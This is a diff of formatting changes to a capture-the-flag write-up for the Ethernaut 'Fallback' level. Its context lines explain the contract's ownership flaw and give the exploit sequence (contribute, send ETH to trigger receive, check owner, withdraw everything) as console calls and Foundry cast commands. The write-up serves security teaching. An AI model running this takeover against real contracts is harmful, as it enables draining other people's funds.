@@ -16,8 +16,9 @@ We can use it to become the owner.
 
 -   Withdraw all ETH from the contract
 
-* * * * *
+
 **Ethernaut Info**
+------------
 
 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.
 
@@ -25,7 +26,7 @@ You've also learnt about OpenZeppelin's Ownable contract, and how it can be used
 
 Move on to the next level when you're ready!
 
-* * * * *
+
 
 
 **Contract**
@@ -72,7 +73,7 @@ contract Fallback {
 }
 ```
 
-* * * * *
+
 
 **Vulnerability**
 -----------------
@@ -94,7 +95,7 @@ If:
 
 This is a bad design.
 
-* * * * *
+
 
 **Attack Strategy**
 -------------------
@@ -109,7 +110,7 @@ We need to:
 
 4.  Call withdraw()
 
-* * * * *
+
 
 **Exploit Steps**
 -----------------
@@ -122,7 +123,7 @@ We need to:
 await contract.contribute({ value: toWei("0.0005") })
 ```
 
-* * * * *
+
 
 #### **2\. Send ETH to trigger receive**
 
@@ -132,7 +133,7 @@ await contract.sendTransaction({
 })
 ```
 
-* * * * *
+
 
 #### **3\. Check owner**
 
@@ -142,7 +143,7 @@ await contract.owner()
 
 Now you are the owner.
 
-* * * * *
+
 
 #### **4\. Withdraw ETH**
 
@@ -150,7 +151,7 @@ Now you are the owner.
 await contract.withdraw()
 ```
 
-* * * * *
+
 
 ### **Method 2 --- Foundry**
 
@@ -160,7 +161,7 @@ await contract.withdraw()
 cast send $CONTRACT "contribute()" --value 0.0005ether --private-key $PRIVATE_KEY
 ```
 
-* * * * *
+
 
 #### **2\. Trigger receive**
 
@@ -168,7 +169,7 @@ cast send $CONTRACT "contribute()" --value 0.0005ether --private-key $PRIVATE_KE
 cast send $CONTRACT --value 0.0001ether --private-key $PRIVATE_KEY
 ```
 
-* * * * *
+
 
 #### **3\. Check owner**
 
@@ -176,7 +177,7 @@ cast send $CONTRACT --value 0.0001ether --private-key $PRIVATE_KEY
 cast call $CONTRACT "owner()(address)"
 ```
 
-* * * * *
+
 
 #### **4\. Withdraw**
 
@@ -184,7 +185,7 @@ cast call $CONTRACT "owner()(address)"
 cast send $CONTRACT "withdraw()" --private-key $PRIVATE_KEY
 ```
 
-* * * * *
+
 
 **Why This Works**
 ------------------
@@ -201,7 +202,7 @@ cast send $CONTRACT "withdraw()" --private-key $PRIVATE_KEY
 
 We can easily pass both conditions
 
-* * * * *
+
 
 **Key Takeaways**
 -----------------
@@ -214,7 +215,7 @@ We can easily pass both conditions
 
 -   Small mistakes = full contract control
 
-* * * * *
+
 
 **Tools**
 ---------
@@ -225,7 +226,7 @@ We can easily pass both conditions
 
 -   RPC provider
 
-* * * * *
+
 
 **Summary**
 -----------
